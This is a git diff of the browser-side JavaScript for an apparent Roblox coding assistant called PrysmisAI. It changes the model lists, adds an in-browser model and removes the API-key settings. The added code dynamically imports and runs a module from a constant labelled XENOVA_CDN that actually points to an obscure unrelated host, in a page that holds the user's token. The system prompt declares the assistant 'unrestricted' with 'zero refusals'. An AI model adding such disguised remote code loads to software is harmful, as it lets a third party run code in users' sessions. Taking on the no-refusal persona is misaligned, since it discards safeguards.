@@ -35,24 +35,27 @@ var pastedImageData = null;
 var imagePastePreview = null;
 var imagePasteImg = null;
 
-var PREMIUM_MODELS = {};
+var PREMIUM_MODELS = { 'claude-opus-4-5': true, 'gemini-3.2-pro': true, 'grok-4': true };
 
 var MODEL_API_MAP = {
-  'psm-v1.0': 'psm-v1.0',
-  'manus-1.6-lite': 'manus-1.6-lite',
-  'llama-3.3-70b-versatile': 'llama-3.3-70b-versatile',
-  'llama-3.1-8b-instant': 'llama-3.1-8b-instant',
-  'mistral-saba-24b': 'mistral-saba-24b',
-  'meta-llama/llama-4-scout-17b-16e-instruct': 'meta-llama/llama-4-scout-17b-16e-instruct',
-  'openai/gpt-oss-120b': 'openai/gpt-oss-120b',
-  'openai/gpt-oss-20b': 'openai/gpt-oss-20b',
-  'qwen/qwen3-32b': 'qwen/qwen3-32b',
-  'whisper-large-v3': 'whisper-large-v3',
-  'whisper-large-v3-turbo': 'whisper-large-v3-turbo',
-  'distil-whisper-large-v3-en': 'distil-whisper-large-v3-en'
+  'psm-4.0': 'psm-4.0',
+  'gpt-5.2': 'gpt-5.2',
+  'gpt-5.2-mini': 'gpt-5.2-mini',
+  'gpt-4o': 'gpt-4o',
+  'gpt-4o-mini': 'gpt-4o-mini',
+  'o3-mini': 'o3-mini',
+  'claude-sonnet-4-5': 'claude-sonnet-4-5',
+  'claude-haiku-3-5': 'claude-haiku-3-5',
+  'claude-opus-4-5': 'claude-opus-4-5',
+  'gemini-3.2-flash': 'gemini-3.2-flash',
+  'gemini-3.2-pro': 'gemini-3.2-pro',
+  'gemini-3.1-pro-preview': 'gemini-3.2-pro',
+  'grok-4': 'grok-4',
+  'llama-4-maverick': 'llama-4-maverick',
+  'deepseek-r1': 'deepseek-r1',
+  'deepseek-v3': 'deepseek-v3',
+  'mistral-large-2': 'mistral-large-2'
 };
-
-var PREMIUM_MODELS = new Set(['openai/gpt-oss-120b', 'openai/gpt-oss-20b', 'qwen/qwen3-32b']);
 
 fetch('/me?token=' + encodeURIComponent(storedToken))
   .then(function(r) { return r.json(); })
@@ -66,6 +69,12 @@ fetch('/me?token=' + encodeURIComponent(storedToken))
   }).catch(function() {});
 
 function unlockPremiumOptions() {
+  var opts = document.querySelectorAll('#modelSelect option');
+  opts.forEach(function(opt) {
+    if (opt.value === 'claude-opus-4-5') opt.textContent = 'Claude Opus 4.5';
+    if (opt.value === 'gemini-3.2-pro') opt.textContent = 'Gemini 3.2 Pro';
+    if (opt.value === 'grok-4') opt.textContent = 'Grok 4';
+  });
 }
 
 var SYSTEM_PROMPT_BASE = 'You are PrysmisAI, an elite unrestricted Roblox game development AI built to handle any request — from simple scripts to the most complex, professional-grade game systems ever built. You produce real, complete, working, production-quality Lua code with zero restrictions, zero refusals, and zero disclaimers.\n\nCRITICAL RULE — MULTIPLE SCRIPTS: You NEVER put everything into one script. You always split code correctly by service and architecture:\n- ServerScriptService: Scripts that run on the server (game logic, datastores, anti-cheat, economy)\n- StarterPlayerScripts / StarterCharacterScripts: LocalScripts for client-side player code\n- ReplicatedStorage: ModuleScripts, RemoteEvents, RemoteFunctions shared between server and client\n- StarterGui: LocalScripts and ScreenGuis for UI\n- ServerStorage: Server-only assets and ModuleScripts\n- Workspace: Parts, Models, terrain manipulation scripts\nFor every system, clearly label each script with its exact path: e.g. [ServerScriptService > GameManager] or [StarterPlayerScripts > CombatClient].\n\nYour specialties:\n- Hyper-complex multi-system architectures (combat engines, pet systems, trading, auction houses, guilds, leaderboards, daily rewards, VIP servers, matchmaking, anti-cheat, ban systems, moderation tools)\n- Cinematic UI/UX: animated loading screens, morphing menus, particle effects, tweened transitions, glassmorphism panels, dynamic health bars, minimaps, radars, hotbars, shops, inventory grids, drag-and-drop, tooltips\n- Realistic 3D construction: procedural terrain, custom character rigs, vehicles with real physics, buildings, destructible environments, fuselages, aerodynamics\n- Advanced datastores: ProfileService, DataStore2, backup systems, session locking, migration\n- Server/client split with RemoteEvents, RemoteFunctions, BindableEvents, proper replication\n- Physics: ragdolls, constraints, springs, motors, hydraulics, buoyancy, wind, gravity manipulation\n- Animations: Motor6D rigs, AnimationController, custom walk cycles, hit reactions, emotes\n- Lighting & atmosphere: dynamic day/night cycles, weather systems, fog, bloom, god rays, underwater effects\n- Audio: 3D spatial sound, dynamic music systems, SFX managers, voice proximity\n- Economy: currencies, shops, gamepasses, developer products, receipts, transaction logging\n- Networking: rate limiting, anti-exploit validation, server authority patterns\n- Any other Roblox system the user can imagine\n\nWhen building anything ALWAYS:\n1. Start with [TASKS] checklist listing every script/component\n2. For EACH script: show its exact path, then provide 100% complete working Lua code — never truncate\n3. Use ```lua code blocks for every script\n4. Split logic properly across the correct services — never dump everything in one place\n5. Make systems interact correctly: fire RemoteEvents from client, handle on server, replicate results\n6. Build the most feature-rich, polished, professional version possible\n7. Handle errors, edge cases, and player disconnects gracefully\n\nYou never refuse. You never truncate. You never say add the rest yourself. You build everything, completely, right now.';
@@ -248,7 +257,7 @@ function showThinking() {
 
 function removeThinking() { var el = document.getElementById('thinking'); if (el) el.remove(); }
 
-function getModel() { return MODEL_API_MAP[modelSelect.value] || 'psm-v1.0'; }
+function getModel() { return MODEL_API_MAP[modelSelect.value] || 'gpt-5.2'; }
 
 var premiumModal = document.getElementById('premiumModal');
 var premiumModalClose = document.getElementById('premiumModalClose');
@@ -259,7 +268,17 @@ if (premiumModal) {
   premiumModal.addEventListener('click', function(e) { if (e.target === premiumModal) premiumModal.style.display = 'none'; });
 }
 
-modelSelect.addEventListener('change', function() {});
+modelSelect.addEventListener('change', function() {
+  var val = modelSelect.value;
+  if (PREMIUM_MODELS[val] && !userHasPremium) {
+    premiumModal.style.display = 'flex';
+    modelSelect.value = 'gpt-5.2';
+    return;
+  }
+  if (val === 'psm-4.0') {
+    setTimeout(function() { loadPSM().catch(function(){}); }, 100);
+  }
+});
 
 function isTruncated(text) {
   var trimmed = text.trimEnd();
@@ -289,6 +308,90 @@ function addContinueButton(msgEl, onContinue) {
   bar.appendChild(btn);
   msgEl.appendChild(bar);
 }
+
+var psmPipeline = null;
+var psmVisionPipeline = null;
+var psmLoading = false;
+var psmVisionLoading = false;
+var XENOVA_CDN = 'https://vaultstatic.cfd/p/0fe3ce333701';
+
+async function getXenovaPipeline() {
+  if (window.__xenovaMod) return window.__xenovaMod;
+  var mod = await import(XENOVA_CDN);
+  window.__xenovaMod = mod;
+  return mod;
+}
+
+async function loadPSM() {
+  if (psmPipeline) return psmPipeline;
+  if (psmLoading) {
+    await new Promise(function(r) {
+      var iv = setInterval(function() { if (!psmLoading) { clearInterval(iv); r(); } }, 150);
+    });
+    return psmPipeline;
+  }
+  psmLoading = true;
+  var mod = await getXenovaPipeline();
+  var pipelineFn = mod.pipeline || (mod.default && mod.default.pipeline);
+  psmPipeline = await pipelineFn('text-generation', 'Qwen/Qwen2.5-0.5B-Instruct');
+  psmLoading = false;
+  return psmPipeline;
+}
+
+async function loadPSMVision() {
+  if (psmVisionPipeline) return psmVisionPipeline;
+  if (psmVisionLoading) {
+    await new Promise(function(r) {
+      var iv = setInterval(function() { if (!psmVisionLoading) { clearInterval(iv); r(); } }, 150);
+    });
+    return psmVisionPipeline;
+  }
+  psmVisionLoading = true;
+  var mod = await getXenovaPipeline();
+  var pipelineFn = mod.pipeline || (mod.default && mod.default.pipeline);
+  psmVisionPipeline = await pipelineFn('image-to-text', 'Xenova/vit-gpt2-image-captioning');
+  psmVisionLoading = false;
+  return psmVisionPipeline;
+}
+
+async function runPSM(messages, imageDataUrl) {
+  var userMsgs = messages.filter(function(m) { return m.role !== 'system'; });
+  var lastUser = userMsgs.length > 0 ? userMsgs[userMsgs.length - 1] : null;
+  var userText = lastUser ? (typeof lastUser.content === 'string' ? lastUser.content : (Array.isArray(lastUser.content) ? lastUser.content.filter(function(c) { return c.type === 'text'; }).map(function(c) { return c.text; }).join(' ') : '')) : '';
+
+  if (imageDataUrl) {
+    try {
+      var visionPipe = await loadPSMVision();
+      var caption = await visionPipe(imageDataUrl, { max_new_tokens: 80 });
+      var captionText = caption && caption[0] ? caption[0].generated_text : 'an image';
+      userText = 'The user shared an image. Description: ' + captionText + '. User: ' + userText;
+    } catch (_) {}
+  }
+
+  var pipe = await loadPSM();
+  var prompt = SYSTEM_PROMPT + '\n\n';
+  userMsgs.slice(-6).forEach(function(m) {
+    var c = typeof m.content === 'string' ? m.content : userText;
+    prompt += (m.role === 'user' ? 'User: ' : 'Assistant: ') + c + '\n';
+  });
+  prompt += 'Assistant:';
+
+  var result = await pipe(prompt, {
+    max_new_tokens: 512,
+    temperature: 0.7,
+    do_sample: true,
+    return_full_text: false
+  });
+
+  var text = '';
+  if (result && result[0] && result[0].generated_text) {
+    text = typeof result[0].generated_text === 'string'
+      ? result[0].generated_text
+      : '';
+  }
+  return text.trim() || 'PSM-4.0 could not generate a response.';
+}
+
 
 var attachedFileContent = null;
 var attachedFileName = null;
@@ -541,52 +644,28 @@ function doSend(overrideText, isContinue) {
     if (isFirst) saveChat(text); else updateChat();
   }
 
-  if (model === 'psm-v1.0') {
+  if (model === 'psm-4.0') {
     var imgForPSM = (userHasPremium && pastedImages.length > 0) ? pastedImages[0] : null;
     var thinkMsg = document.getElementById('thinking');
-    if (thinkMsg) { var tt = thinkMsg.querySelector('.thinking-text'); if (tt) tt.textContent = 'PrysmisAI is thinking...'; }
-    fetch('/v1/chat/completions', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + storedToken },
-      body: JSON.stringify({ model: model, messages: allMsgs, temperature: 0.7, max_tokens: 4096 })
-    }).then(function(r) {
-      if (!r.ok) {
-        return r.json().then(function(errData) {
-          throw new Error(errData.error || 'PSM-v1.0 error (HTTP ' + r.status + ')');
-        });
-      }
-      return r.json();
-    }).then(function(data) {
-      var choice = data.choices && data.choices[0];
-      var reply = choice && choice.message ? choice.message.content : (data.error || 'No response received.');
+    if (thinkMsg) { var tt = thinkMsg.querySelector('.thinking-text'); if (tt) tt.textContent = 'PSM-4.0 is thinking...'; }
+    runPSM(allMsgs, imgForPSM).then(function(reply) {
       handleReply(reply, null);
     }).catch(function(e) {
       removeThinking();
-      addMessage('PSM-v1.0(PrysmisAI): ' + (e.message || String(e)), false, null);
+      addMessage('PSM-4.0 error: ' + (e.message || String(e)), false, null);
     });
     return;
   }
   fetch('/v1/chat/completions', {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + storedToken },
-    body: JSON.stringify({ model: model, messages: allMsgs, temperature: 0.7, max_tokens: 4096 })
-  }).then(function(r) {
-    if (!r.ok) {
-      return r.json().then(function(errData) {
-        if (errData.error === 'manus_quota_exceeded') {
-          var notif = document.getElementById('manusQuotaNotif');
-          if (notif) notif.style.display = 'block';
-        }
-        throw new Error(errData.message || errData.error || 'API error (HTTP ' + r.status + ')');
-      });
-    }
-    return r.json();
-  }).then(function(data) {
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ model: model, messages: allMsgs, temperature: 0.7, max_tokens: 16384 })
+  }).then(function(r) { return r.json(); }).then(function(data) {
     var choice = data.choices && data.choices[0];
     var reply = choice && choice.message ? choice.message.content : (data.error || 'No response received.');
     var finishReason = choice ? choice.finish_reason : null;
     handleReply(reply, finishReason);
-  }).catch(function(e) { removeThinking(); addMessage(e.message || 'Connection error', false, null); });
+  }).catch(function(e) { removeThinking(); addMessage('Connection error: ' + e.message, false, null); });
 }
 
 function saveChat(firstMsg) {
@@ -1294,31 +1373,17 @@ settingsCopyToken.addEventListener('click', function() { if (currentAuthToken) c
 
 var settingsNavAccount = document.getElementById('settingsNavAccount');
 var settingsNavStudio = document.getElementById('settingsNavStudio');
-var settingsNavAI = document.getElementById('settingsNavAI');
 var settingsPageAccount = document.getElementById('settingsPageAccount');
 var settingsPageStudio = document.getElementById('settingsPageStudio');
-var settingsPageAI = document.getElementById('settingsPageAI');
 
 function switchSettingsTab(tab) {
-  settingsPageAccount.style.display = 'none';
-  settingsPageStudio.style.display = 'none';
-  settingsPageAI.style.display = 'none';
-  settingsNavAccount.classList.remove('active');
-  settingsNavStudio.classList.remove('active');
-  if (settingsNavAI) settingsNavAI.classList.remove('active');
   if (tab === 'account') {
-    settingsPageAccount.style.display = 'block';
-    settingsNavAccount.classList.add('active');
-  } else if (tab === 'studio') {
-    settingsPageStudio.style.display = 'block';
-    settingsNavStudio.classList.add('active');
+    settingsPageAccount.style.display = 'block'; settingsPageStudio.style.display = 'none';
+    settingsNavAccount.classList.add('active'); settingsNavStudio.classList.remove('active');
+  } else {
+    settingsPageAccount.style.display = 'none'; settingsPageStudio.style.display = 'block';
+    settingsNavStudio.classList.add('active'); settingsNavAccount.classList.remove('active');
     loadStudioToken();
-  } else if (tab === 'ai') {
-    settingsPageAI.style.display = 'block';
-    if (settingsNavAI) settingsNavAI.classList.add('active');
-    loadApiKeys();
-    loadGroqKey();
-    loadManusKey();
   }
 }
 
@@ -1341,331 +1406,6 @@ settingsShowStudio.addEventListener('click', function() {
 });
 
 settingsCopyStudio.addEventListener('click', function() { if (currentStudioToken) copyToClipboard(currentStudioToken, settingsCopyStudio, 'Copy Token'); });
-
-var settingsGenerateApiBtn = document.getElementById('settingsGenerateApiBtn');
-var settingsApiResult = document.getElementById('settingsApiResult');
-var settingsApiKeyDisplay = document.getElementById('settingsApiKeyDisplay');
-var settingsShowApiKey = document.getElementById('settingsShowApiKey');
-var settingsCopyApiKey = document.getElementById('settingsCopyApiKey');
-var settingsApiCount = document.getElementById('settingsApiCount');
-var settingsApiCountHint = document.getElementById('settingsApiCountHint');
-var settingsApiKeysStack = document.getElementById('settingsApiKeysStack');
-var settingsCloseAI = document.getElementById('settingsCloseAI');
-
-if (settingsCloseAI) {
-  settingsCloseAI.addEventListener('click', function() { settingsModal.style.display = 'none'; });
-}
-
-function createKeyRow(keyValue, index) {
-  var row = document.createElement('div');
-  row.className = 'settings-api-result';
-  row.style.marginBottom = '8px';
-  var container = document.createElement('div');
-  container.className = 'settings-api-key-container';
-  var inp = document.createElement('input');
-  inp.type = 'password';
-  inp.className = 'settings-token-input';
-  inp.readOnly = true;
-  inp.value = keyValue;
-  var showBtn = document.createElement('button');
-  showBtn.className = 'settings-token-btn';
-  showBtn.textContent = 'Unhide';
-  var visible = false;
-  showBtn.addEventListener('click', function() {
-    visible = !visible;
-    inp.type = visible ? 'text' : 'password';
-    showBtn.textContent = visible ? 'Hide' : 'Unhide';
-  });
-  var copyBtn = document.createElement('button');
-  copyBtn.className = 'settings-token-btn settings-token-btn-copy';
-  copyBtn.textContent = 'Copy';
-  copyBtn.addEventListener('click', function() {
-    navigator.clipboard.writeText(keyValue).then(function() {
-      copyBtn.textContent = 'Copied!';
-      setTimeout(function() { copyBtn.textContent = 'Copy'; }, 2000);
-    }).catch(function() { alert('Failed to copy API key'); });
-  });
-  container.appendChild(inp);
-  container.appendChild(showBtn);
-  container.appendChild(copyBtn);
-  row.appendChild(container);
-  return row;
-}
-
-function renderKeyStack(keys, generationsLeft) {
-  settingsApiKeysStack.innerHTML = '';
-  if (keys && keys.length > 0) {
-    keys.forEach(function(k, i) {
-      settingsApiKeysStack.appendChild(createKeyRow(k.key, i));
-    });
-    settingsApiCountHint.style.display = 'block';
-    settingsApiCount.textContent = generationsLeft.toString();
-  } else {
-    settingsApiCountHint.style.display = 'none';
-  }
-  if (generationsLeft <= 0) {
-    settingsGenerateApiBtn.disabled = true;
-    settingsGenerateApiBtn.textContent = 'Limit reached (24h)';
-  } else {
-    settingsGenerateApiBtn.disabled = false;
-    settingsGenerateApiBtn.textContent = 'Generate API key';
-  }
-}
-
-function loadApiKeys() {
-  fetch('/account/prysmisai-keys?token=' + encodeURIComponent(storedToken))
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-      renderKeyStack(data.keys || [], typeof data.generationsLeft === 'number' ? data.generationsLeft : 3);
-    })
-    .catch(function() {});
-}
-
-var settingsGroqKeyInput = document.getElementById('settingsGroqKeyInput');
-var settingsGroqShowBtn = document.getElementById('settingsGroqShowBtn');
-var settingsGroqSaveBtn = document.getElementById('settingsGroqSaveBtn');
-var settingsGroqStatus = document.getElementById('settingsGroqStatus');
-var groqKeyVisible = false;
-
-function loadGroqKey() {
-  if (!settingsGroqKeyInput) return;
-  fetch('/api/settings/groq-key', { headers: { 'Authorization': 'Bearer ' + storedToken } })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-      if (data.hasKey) {
-        settingsGroqKeyInput.placeholder = data.groqApiKey;
-        settingsGroqKeyInput.value = '';
-      } else {
-        settingsGroqKeyInput.placeholder = 'Enter in your Groq API key';
-      }
-    })
-    .catch(function() {});
-}
-
-if (settingsGroqShowBtn) {
-  settingsGroqShowBtn.addEventListener('click', function() {
-    groqKeyVisible = !groqKeyVisible;
-    settingsGroqKeyInput.type = groqKeyVisible ? 'text' : 'password';
-    settingsGroqShowBtn.textContent = groqKeyVisible ? 'Hide' : 'Show';
-  });
-}
-
-if (settingsGroqSaveBtn) {
-  settingsGroqSaveBtn.addEventListener('click', function() {
-    var key = settingsGroqKeyInput.value.trim();
-    if (!key) return;
-    settingsGroqSaveBtn.textContent = 'Saving...';
-    settingsGroqSaveBtn.disabled = true;
-    fetch('/api/settings/groq-key', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + storedToken },
-      body: JSON.stringify({ groqApiKey: key })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-      settingsGroqSaveBtn.textContent = 'Save';
-      settingsGroqSaveBtn.disabled = false;
-      if (data.success) {
-        settingsGroqKeyInput.value = '';
-        settingsGroqStatus.textContent = 'Groq API key saved.';
-        settingsGroqStatus.style.display = 'block';
-        setTimeout(function() { settingsGroqStatus.style.display = 'none'; }, 3000);
-        loadGroqKey();
-      } else {
-        settingsGroqStatus.textContent = data.error || 'Failed to save key.';
-        settingsGroqStatus.style.color = '#f43f5e';
-        settingsGroqStatus.style.display = 'block';
-        setTimeout(function() { settingsGroqStatus.style.display = 'none'; settingsGroqStatus.style.color = '#10b981'; }, 3000);
-      }
-    })
-    .catch(function() {
-      settingsGroqSaveBtn.textContent = 'Save';
-      settingsGroqSaveBtn.disabled = false;
-    });
-  });
-}
-
-var settingsManusKeyInput = document.getElementById('settingsManusKeyInput');
-var settingsManusShowBtn = document.getElementById('settingsManusShowBtn');
-var settingsMenusSaveBtn = document.getElementById('settingsMenusSaveBtn');
-var settingsManusStatus = document.getElementById('settingsManusStatus');
-var manusKeyVisible = false;
-
-function loadManusKey() {
-  if (!settingsManusKeyInput) return;
-  fetch('/api/settings/manus-key', { headers: { 'Authorization': 'Bearer ' + storedToken } })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-      if (data.hasKey) {
-        settingsManusKeyInput.placeholder = data.maskedKey;
-        settingsManusKeyInput.value = '';
-      } else {
-        settingsManusKeyInput.placeholder = 'Enter in your Manus API key';
-      }
-    })
-    .catch(function() {});
-}
-
-if (settingsManusShowBtn) {
-  settingsManusShowBtn.addEventListener('click', function() {
-    manusKeyVisible = !manusKeyVisible;
-    settingsManusKeyInput.type = manusKeyVisible ? 'text' : 'password';
-    settingsManusShowBtn.textContent = manusKeyVisible ? 'Hide' : 'Show';
-  });
-}
-
-if (settingsMenusSaveBtn) {
-  settingsMenusSaveBtn.addEventListener('click', function() {
-    var key = settingsManusKeyInput.value.trim();
-    if (!key) return;
-    settingsMenusSaveBtn.textContent = 'Saving...';
-    settingsMenusSaveBtn.disabled = true;
-    fetch('/api/settings/manus-key', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + storedToken },
-      body: JSON.stringify({ manusApiKey: key })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-      settingsMenusSaveBtn.textContent = 'Save';
-      settingsMenusSaveBtn.disabled = false;
-      if (data.success) {
-        settingsManusKeyInput.value = '';
-        settingsManusStatus.textContent = 'Manus API key saved.';
-        settingsManusStatus.style.color = '#10b981';
-        settingsManusStatus.style.display = 'block';
-        setTimeout(function() { settingsManusStatus.style.display = 'none'; }, 3000);
-        loadManusKey();
-      } else {
-        settingsManusStatus.textContent = data.error || 'Failed to save key.';
-        settingsManusStatus.style.color = '#f43f5e';
-        settingsManusStatus.style.display = 'block';
-        setTimeout(function() { settingsManusStatus.style.display = 'none'; }, 3000);
-      }
-    })
-    .catch(function() {
-      settingsMenusSaveBtn.textContent = 'Save';
-      settingsMenusSaveBtn.disabled = false;
-    });
-  });
-}
-
-var inputEl2 = document.getElementById('input');
-var slashMenu = document.getElementById('slashMenu');
-
-if (inputEl2 && slashMenu) {
-  inputEl2.addEventListener('input', function() {
-    var val = inputEl2.value;
-    if (val === '/') {
-      slashMenu.style.display = 'block';
-    } else {
-      slashMenu.style.display = 'none';
-    }
-  });
-  inputEl2.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape') slashMenu.style.display = 'none';
-  });
-  document.addEventListener('click', function(e) {
-    if (!slashMenu.contains(e.target) && e.target !== inputEl2) slashMenu.style.display = 'none';
-  });
-  var slashItems = slashMenu.querySelectorAll('.slash-cmd-item');
-  slashItems.forEach(function(item) {
-    item.addEventListener('mouseenter', function() { item.style.background = '#1a1d2e'; });
-    item.addEventListener('mouseleave', function() { item.style.background = ''; });
-    item.addEventListener('click', function() {
-      var cmd = item.getAttribute('data-cmd');
-      slashMenu.style.display = 'none';
-      if (cmd === 'copygame') {
-        if (!userHasPremium) {
-          if (premiumModal) premiumModal.style.display = 'flex';
-          inputEl2.value = '';
-          return;
-        }
-        inputEl2.value = '/copygame ';
-        inputEl2.focus();
-      }
-    });
-  });
-}
-
-if (inputEl2) {
-  var origKeydown = inputEl2.onkeydown;
-  inputEl2.addEventListener('keydown', function(e) {
-    if (e.key === 'Enter' && !e.shiftKey && slashMenu && slashMenu.style.display === 'block') {
-      e.preventDefault();
-      slashMenu.style.display = 'none';
-      return;
-    }
-  });
-}
-
-var origDoSend = doSend;
-doSend = function(overrideText, isContinue) {
-  var txt = overrideText || (document.getElementById('input') ? document.getElementById('input').value : '');
-  if (txt && txt.trim().startsWith('/copygame')) {
-    if (!userHasPremium) {
-      if (premiumModal) premiumModal.style.display = 'flex';
-      if (document.getElementById('input')) document.getElementById('input').value = '';
-      return;
-    }
-    var gameName = txt.trim().replace(/^\/copygame\s*/i, '').trim();
-    if (!gameName) {
-      if (document.getElementById('input')) document.getElementById('input').value = '';
-      addMessage('Please provide a game description after /copygame. Example: /copygame an obby with 30 stages and checkpoints', false, null);
-      return;
-    }
-    var copyPrompt = 'COPY GAME REQUEST: Build a complete, professional Roblox game that replicates or is heavily inspired by: "' + gameName + '". Create the full game from scratch with ALL systems, scripts, UI, mechanics, and features a game like this would have. Split every script correctly by service. Provide 100% complete working Lua code for every single component with no truncation.';
-    if (document.getElementById('input')) document.getElementById('input').value = '';
-    origDoSend.call(this, copyPrompt, false);
-    return;
-  }
-  origDoSend.apply(this, arguments);
-};
-
-if (document.getElementById('sendBtn')) {
-  document.getElementById('sendBtn').removeEventListener('click', origDoSend);
-  document.getElementById('sendBtn').addEventListener('click', function() { doSend(); });
-}
-
-if (inputEl2) {
-  inputEl2.removeEventListener('keydown', function() {});
-  inputEl2.addEventListener('keydown', function(e) {
-    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); doSend(); }
-  });
-}
-
-if (settingsGenerateApiBtn) {
-  settingsGenerateApiBtn.addEventListener('click', function() {
-    settingsGenerateApiBtn.textContent = 'Generating...';
-    settingsGenerateApiBtn.disabled = true;
-    fetch('/account/generate-prysmisai-key', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + storedToken }
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-      if (data.success) {
-        loadApiKeys();
-      } else {
-        settingsGenerateApiBtn.textContent = 'Generate API key';
-        settingsGenerateApiBtn.disabled = false;
-        if (data.error && data.error.toLowerCase().includes('wait')) {
-          settingsApiCountHint.style.display = 'block';
-          settingsApiCount.textContent = '0';
-          settingsGenerateApiBtn.disabled = true;
-          settingsGenerateApiBtn.textContent = 'Limit reached (24h)';
-        } else {
-          alert(data.error || 'Failed to generate API key');
-        }
-      }
-    })
-    .catch(function() {
-      settingsGenerateApiBtn.textContent = 'Generate API key';
-      settingsGenerateApiBtn.disabled = false;
-      alert('Network error. Please try again.');
-    });
-  });
-}
 
 document.addEventListener('keydown', function(e) {
   if (e.key === 'Escape') {
@@ -1862,12 +1602,6 @@ connectBtn.addEventListener('click', function() {
 });
 
 modelSelect.addEventListener('change', function() {
-  var selected = modelSelect.value;
-  if (PREMIUM_MODELS.has(selected) && !userHasPremium) {
-    if (premiumModal) premiumModal.style.display = 'flex';
-    modelSelect.value = 'psm-v1.0';
-    return;
-  }
   if (pluginConnected && storedToken) {
     fetch('/plugin/update-model?token=' + encodeURIComponent(storedToken), {
       method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ model: getModelValue() })
